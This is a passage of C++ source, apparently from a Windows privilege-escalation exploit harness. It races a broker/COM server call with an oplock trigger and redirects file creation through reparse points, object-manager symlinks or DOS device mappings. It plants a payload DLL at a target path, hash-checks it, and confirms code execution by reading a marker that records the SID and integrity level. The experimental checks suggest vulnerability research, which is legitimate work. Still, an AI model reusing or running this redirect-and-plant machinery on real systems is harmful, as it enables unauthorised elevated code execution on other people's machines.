        const long long freq = win::qpc_frequency();
        const long long target =
            releaseTick + (freq * attemptSwapStartOffsetUs) / 1'000'000;
        while (win::qpc_now() < target) {
          YieldProcessor();
        }
      }
      swap = omSwap
          ? active_swap_om(run, decoySymlink, omFinalTarget, swapWindowMs)
          : dosSwap
                ? active_swap_dos(
                      run.dosDeviceName, dosPrepTarget, dosFinalTarget,
                      swapWindowMs)
                : active_swap(
                      run, preparedReparse, safePin.leaf_handle(), swapWindowMs);
      swapStage = swap.stage;
      swapError = swap.error;
      if (!swap.ok && swap.error != "none") {
        lastError = swap.error;
      }
    } else {
      lastError = "race trigger did not fire before timeout";
      sensor.release();
    }

    const unsigned workerJoinMs =
        config.invokeTimeoutMs > 0
            ? static_cast<unsigned>(config.invokeTimeoutMs)
            : static_cast<unsigned>(config.oplockTimeoutMs) + 30000u;
    const win::BrokerOutcome invocation = session.wait(workerJoinMs);
    invokeReturnTick = win::qpc_now();
    const bool workerJoined = !invocation.timedOut;
    const ServerCompletion serverCompletion = server_completion_from(invocation);
    lastServerCompletion = serverCompletion;
    anyTriggerObserved = anyTriggerObserved || oplockBreak;
    anyRedirectInstalled = anyRedirectInstalled || swap.ok;

    if (invocation.timedOut) {

      comCallResult = "client_timeout:invocation host killed after " +
                      std::to_string(workerJoinMs) + "ms; server completion unknown";
      lastError = comCallResult;
    } else if (invocation.status != "success") {
      comCallResult = "error:" + describe_broker_failure(invocation);
    }

    win::FileObservation observation;
    std::string observationError;
    const auto observationDeadline =
        std::chrono::steady_clock::now() +
        std::chrono::milliseconds(
            static_cast<long long>(config.target.effectObservationMs));
    do {
      targetExists = target_materialized(run);
      if (targetExists) {
        try {
          observation = is_payload_mode(config.mode)
              ? win::inspect_file_against_file(
                    run.targetPath, run.payloadPath)
              : win::inspect_file_against_content(run.targetPath, run.content);
          contentMatch = observation.contentMatches;
          observationError.clear();
        } catch (const std::exception& ex) {
          observationError = ex.what();
        }
      }
      if (contentMatch ||
          std::chrono::steady_clock::now() >= observationDeadline) {
        break;
      }
      std::this_thread::sleep_for(std::chrono::milliseconds(25));
    } while (true);
    if (!observationError.empty() && config.verbose) {
      std::cout << "[*] post-return effect observation: "
                << observationError << "\n";
    }

    targetSeenTick = win::qpc_now();

    if (!workspacePin.verify() || !targetPin.verify() ||
        !safePin.verify(swap.ok)) {
      RunResult namespaceChanged{
          false,
          attempt,
          "pinned workspace/target namespace changed during the attempt; "
          "discarding all causal claims"};
      namespaceChanged.callerSid = win::current_process_user_sid();
      namespaceChanged.experimentNonce = experimentNonce;
      namespaceChanged.callerCreateAccess = callerAccess;
      namespaceChanged.serverCompletion = serverCompletion;
      return finishPinnedAttempt(std::move(namespaceChanged));
    }

    RaceTranscript transcript;
    transcript.measured = oplockBreak;
    transcript.swapRetries = swap.retries;
    transcript.startToTriggerMs = win::qpc_delta_ms(invokeStartTick, breakTick);
    transcript.triggerToReleaseMs = win::qpc_delta_ms(breakTick, releaseTick);
    transcript.releaseToBaitGoneMs =
        win::qpc_delta_ms(releaseTick, swap.baitGoneTick);
    transcript.baitGoneToReparseMs =
        win::qpc_delta_ms(swap.baitGoneTick, swap.reparseSetTick);
    transcript.reparseToInvokeReturnMs =
        win::qpc_delta_ms(swap.reparseSetTick, invokeReturnTick);
    transcript.startToTargetCheckMs =
        win::qpc_delta_ms(invokeStartTick, targetSeenTick);

    if (config.verbose) {
      std::cout << "[*] attempt=" << attempt
                << " swap_start_offset_us=" << attemptSwapStartOffsetUs
                << " trigger=" << win::to_string(triggerKind)
                << " trigger_fired=" << bool_text(oplockBreak)
                << " timing=release_before_swap"
                << " swap_stage=" << swapStage
                << " swap_retries=" << swap.retries
                << " swap_error=\"" << swapError << "\""
                << " com_call_result=\"" << comCallResult << "\""
                << " target_exists=" << bool_text(targetExists)
                << " content_match=" << bool_text(contentMatch);
      if (oplockBreak) {
        std::cout << " t[start->trigger]=" << transcript.startToTriggerMs << "ms"
                  << " t[trigger->release]=" << transcript.triggerToReleaseMs << "ms"
                  << " t[release->bait_gone]=" << transcript.releaseToBaitGoneMs << "ms"
                  << " t[bait_gone->reparse]=" << transcript.baitGoneToReparseMs << "ms";
      }
      std::cout << "\n";
    }

    const bool completeRaceChain = oplockBreak && swap.ok;
    if (targetExists && contentMatch && !completeRaceChain) {
      RunResult rejected{
          false,
          attempt,
          "matching target appeared without a complete trigger-and-redirect chain; "
          "refusing to attribute it to later name resolution"};
      rejected.callerSid = win::current_process_user_sid();
      rejected.experimentNonce = experimentNonce;
      rejected.callerCreateAccess = callerAccess;
      rejected.triggerObserved = oplockBreak;
      rejected.namespaceRedirectInstalled = swap.ok;
      rejected.serverCompletion = serverCompletion;
      return finishPinnedAttempt(std::move(rejected));
    }

    if (targetExists && contentMatch) {
      MarkerVerification marker;
      win::ExecutionMarker parsedMarker;
      bool markerRecordValid = false;
      if (is_execution_mode(config.mode) && config.target.execution.markerRequired) {
        marker = wait_for_execution_marker(
            config.target.execution, run.markerPath);
        if (!marker.contentMatches) {
          std::ostringstream failure;
          failure << "target DLL bytes matched, but required execution marker ";
          if (!marker.exists) {
            failure << "did not appear";
          } else {
            failure << "did not contain expected text";
          }
          failure << " within " << config.target.execution.markerTimeoutMs
                  << " ms: " << run.markerPath;
          RunResult unconfirmed{false, attempt, failure.str()};
          unconfirmed.callerSid = win::current_process_user_sid();
          unconfirmed.experimentNonce = experimentNonce;
          unconfirmed.callerCreateAccess = callerAccess;
          unconfirmed.markerCreateAccess = markerAccess;
          unconfirmed.triggerObserved = oplockBreak;
          unconfirmed.namespaceRedirectInstalled = swap.ok;
          unconfirmed.targetContentMatchedAfterRedirect = true;
          unconfirmed.placementConfirmed = true;
          unconfirmed.executionState = ExecutionState::TriggeredUnconfirmed;
          unconfirmed.expectedExecutionIdentity =
              config.target.execution.expectedIdentity;
          unconfirmed.serverCompletion = serverCompletion;
          unconfirmed.effectStabilityUnknown =
              serverCompletion != ServerCompletion::Returned;
          return finishPinnedAttempt(std::move(unconfirmed));
        }
        parsedMarker = win::parse_execution_marker(run.markerPath);
        markerRecordValid = valid_execution_marker(
            parsedMarker, run.targetPath, experimentNonce);
        if (!markerRecordValid) {
          RunResult invalidMarker{
              false,
              attempt,
              "execution marker matched the configured text but was not a "
              "complete execution record for the planted target: " +
                  run.markerPath};
          invalidMarker.callerSid = win::current_process_user_sid();
          invalidMarker.experimentNonce = experimentNonce;
          invalidMarker.callerCreateAccess = callerAccess;
          invalidMarker.markerCreateAccess = markerAccess;
          invalidMarker.triggerObserved = oplockBreak;
          invalidMarker.namespaceRedirectInstalled = swap.ok;
          invalidMarker.targetContentMatchedAfterRedirect = true;
          invalidMarker.placementConfirmed = true;
          invalidMarker.executionState = ExecutionState::TriggeredUnconfirmed;
          invalidMarker.expectedExecutionIdentity =
              config.target.execution.expectedIdentity;
          invalidMarker.markerVerified = true;
          invalidMarker.markerRecordValid = false;
          invalidMarker.serverCompletion = serverCompletion;
          invalidMarker.effectStabilityUnknown =
              serverCompletion != ServerCompletion::Returned;
          return finishPinnedAttempt(std::move(invalidMarker));
        }
      }

      std::ostringstream out;
      if (config.mode == RunMode::CheckReopen) {
        out << "controlled post-oplock name re-resolution observed after ";
      } else {
        out << "target materialized after ";
      }
      out << attempt
          << " attempt" << (attempt == 1 ? "" : "s") << ": " << run.targetPath
          << "; precheck=" << precheck.detail
          << "; " << win::describe_file_observation(observation)
          << "; race_timing=release_before_swap";
      if (is_payload_mode(config.mode)) {
        if (!config.target.execution.trigger.empty()) {
          out << "; execution_trigger=" << config.target.execution.trigger;
        }
        if (!config.target.execution.expectedIdentity.empty()) {
          out << "; expected_execution_identity=" << config.target.execution.expectedIdentity;
        }
        if (!run.markerPath.empty()) {
          out << "; marker_path=" << run.markerPath;
        }
        if (config.target.execution.markerRequired) {
          out << "; marker_verified=yes";
        }
      }
      if (config.mode == RunMode::CheckReopen) {
        out << "; check_scope=controlled_workspace"
            << "; later_name_resolution_observed=yes"
            << "; causal_writer_attribution=unavailable"
            << "; privilege_boundary_observed=no";
      }
      RunResult success{true, attempt, out.str(), transcript};
      success.callerSid = win::current_process_user_sid();
      success.callerIntegrity = win::current_process_integrity();
      success.osBuild = win::windows_build_string();
      success.callerCreateAccess = callerAccess;
      success.markerCreateAccess = markerAccess;
      success.fileOwner = observation.owner;
      success.fileIntegrityLabel = observation.integrityLabel;
      success.fileSize = observation.size;
      success.experimentNonce = experimentNonce;
      success.triggerObserved = oplockBreak;
      success.namespaceRedirectInstalled = swap.ok;
      success.targetContentMatchedAfterRedirect = true;
      success.placementConfirmed = is_payload_mode(config.mode);
      success.serverCompletion = serverCompletion;
      success.effectStabilityUnknown =
          serverCompletion != ServerCompletion::Returned;
      success.payloadSourceSha256 = artifactSourceSha256;
      success.payloadStagedSha256 = artifactStagedSha256;
      success.payloadSourceSize = artifactSourceSize;
      success.payloadStagedSize = artifactStagedSize;
      success.payloadExactCopy = artifactExactCopy;
      success.payloadDevelopmentNonceOverlay =
          config.target.execution.developmentNonceOverlay;
      if (is_payload_mode(config.mode)) {
        try {
          success.payloadDestinationSha256 =
              win::sha256_file(run.targetPath);
          success.payloadDestinationSize =
              win::file_size_bytes(run.targetPath);
          success.payloadExactMatch =
              success.payloadSourceSize ==
                  success.payloadDestinationSize &&
              success.payloadSourceSha256 ==
                  success.payloadDestinationSha256;
          success.destinationHashStatus = "confirmed_against_staged_payload";
        } catch (const std::exception& ex) {
          success.destinationHashStatus =
              std::string("unavailable: ") + ex.what();
          success.message +=
              "; supplementary destination hashing unavailable: " +
              std::string(ex.what());
        }
      }
      success.markerVerified =
          is_execution_mode(config.mode) && config.target.execution.markerRequired &&
          marker.contentMatches;
      success.markerRecordValid = success.markerVerified && markerRecordValid;
      if (success.markerVerified) {

        success.codeExecSid = parsedMarker.sid;
        success.codeExecProcessImage = parsedMarker.processImage;
        success.codeExecIntegrity = parsedMarker.integrity;
        success.codeExecAccount = parsedMarker.account;
        success.codeExecNonce = parsedMarker.experimentNonce;
        success.codeExecThreadSid = parsedMarker.threadSid;
        success.codeExecThreadIntegrity = parsedMarker.threadIntegrity;
        success.codeExecImpersonating = parsedMarker.impersonating;

        success.codeExecMarkerTrusted =
            markerAccess == AccessTest::Denied;
      }
      if (is_execution_mode(config.mode)) {
        success.expectedExecutionIdentity =
            config.target.execution.expectedIdentity;
        if (!success.markerRecordValid) {
          success.success = false;
          success.executionState = ExecutionState::TriggeredUnconfirmed;
          success.message +=
              "; payload placement confirmed, execution not independently confirmed";
        } else {
          success.executionObserved = true;
          success.executionIdentityMatch = execution_identity_matches_expected(
              config.target.execution.expectedIdentity,
              config.target.execution.identityScope,
              parsedMarker.sid,
              parsedMarker.account,
              parsedMarker.impersonating,
              parsedMarker.threadSid);
          if (!success.executionIdentityMatch) {
            success.success = false;
            success.executionState = ExecutionState::ObservedIdentityMismatch;
            success.message +=
                "; execution observed under an identity that does not match the target requirement";
          } else if (!success.codeExecMarkerTrusted) {
            success.success = false;
            success.executionState = ExecutionState::TriggeredUnconfirmed;
            success.message +=
                "; execution marker location is writable by the caller";
          } else {
            success.executionState = ExecutionState::Confirmed;
          }
        }
      }
      if (success.effectStabilityUnknown) {
        success.success = false;
        success.message +=
            "; effect observed but server completion and effect stability are unknown";
      }
      return finishPinnedAttempt(std::move(success));
    }

    if (targetExists && !contentMatch) {
      std::ostringstream out;
      out << "target materialized but content did not match "
          << (is_payload_mode(config.mode) ? "payload file bytes: " : "content: ")
          << win::describe_file_observation(observation);
      RunResult mismatch{false, attempt, out.str()};
      mismatch.callerSid = win::current_process_user_sid();
      mismatch.experimentNonce = experimentNonce;
      mismatch.callerCreateAccess = callerAccess;
      mismatch.triggerObserved = oplockBreak;
      mismatch.namespaceRedirectInstalled = swap.ok;
      mismatch.serverCompletion = serverCompletion;
      return finishPinnedAttempt(std::move(mismatch));
    }

    if (!workerJoined) {

      RunResult timedOut{false, attempt, "aborted: " + comCallResult};
      timedOut.callerSid = win::current_process_user_sid();
      timedOut.experimentNonce = experimentNonce;
      timedOut.callerCreateAccess = callerAccess;
      timedOut.triggerObserved = oplockBreak;
      timedOut.namespaceRedirectInstalled = swap.ok;
      timedOut.serverCompletion = serverCompletion;
      return finishPinnedAttempt(std::move(timedOut));
    }
    if (invocation.status != "success") {
      lastError = comCallResult;
    } else if (swapError == "none") {
      lastError = "race attempt completed without target materializing";
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(75));
  }

  if (lastError.empty()) {
    lastError = "race attempts completed without target materializing";
  }
  RunResult failed{false, config.attempts, lastError};
  failed.callerSid = win::current_process_user_sid();
  failed.experimentNonce = experimentNonce;
  failed.callerCreateAccess = callerAccess;
  failed.triggerObserved = anyTriggerObserved;
  failed.namespaceRedirectInstalled = anyRedirectInstalled;
  failed.serverCompletion = lastServerCompletion;
  return finish_with_cleanup(std::move(failed), cleanup);
}

std::string sha256_file_platform(const std::string& path) {
  return win::sha256_file(path);
}

std::string new_workspace_platform() {
  std::string directory;
  if (const char* appData = std::getenv("LOCALAPPDATA");
      appData != nullptr && *appData != '\0') {
    directory = (std::filesystem::path(appData) / "Temp").string();
    if (!std::filesystem::exists(directory)) {
      directory.clear();
    }
  }
  if (directory.empty()) {
    directory = std::filesystem::temp_directory_path().string();
  }
  std::string token = win::new_guid_token();
  if (token.size() < 8) {
    token = std::to_string(
        std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()).count());
  }
  return (std::filesystem::path(directory) / token.substr(0, 8)).string();
}

std::string default_workspace_platform() {
  static const std::string workspace = new_workspace_platform();
  return workspace;
}

std::string os_build_platform() {
  static const std::string build = [] {
    std::string value = win::windows_build_string();
    if (value.empty()) return value;
    DWORD ubr = 0;
    DWORD size = sizeof(ubr);
    if (RegGetValueA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            "UBR",
            RRF_RT_REG_DWORD,
            nullptr,
            &ubr,
            &size) == ERROR_SUCCESS) {
      value += '.' + std::to_string(ubr);
    }
    return value;
  }();
  return build;
}

}
